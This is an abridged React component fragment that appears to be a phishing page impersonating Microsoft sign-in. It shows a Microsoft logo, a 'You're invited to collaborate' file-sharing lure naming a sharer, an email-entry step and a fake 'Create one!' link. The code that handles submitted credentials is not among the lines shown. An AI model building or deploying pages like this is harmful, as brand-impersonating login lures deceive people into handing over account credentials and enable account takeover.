...
const App = () => {
    ...
    const FileIcon = () => (<svg className="file-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" > <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" /> </svg>);
                ...
                <div className="login-form-container">
                    ...
                    {isAuthorizationStep ? (
                        <div key="auth-step" className="auth-step">
                            <div style={{ marginBottom: '1.5rem' }}> <img src="ms_logo.png" alt="Logo" className="microsoft-logo" onError={(e) => { e.target.onerror = null; e.target.src = 'https://placehold.co/108x24/cccccc/000000?text=Logo+Error'; }} /> </div>
                            <h1 className="form-title" style={{ marginBottom: '16px' }}>You're invited to collaborate</h1>
                            ...
                            <div className="file-info-container">
                                ...
                                <div className="file-details">
                                    ...
                                    {from && (
                                    <p className="file-sharer">Shared by: {from}</p>
                                    )}
                                </div>
                            </div>
                        ...
                        <div key="email-step">
                            ...
                            <form onSubmit={handleNextClick}>
                                ...
                                <div className="text-xs-custom" style={{ marginBottom: '1.5rem' }}>
                                    <p className="text-gray-700-custom"> No account?{' '} <a href="#" className="link-custom"> Create one! </a> </p>
                                </div>
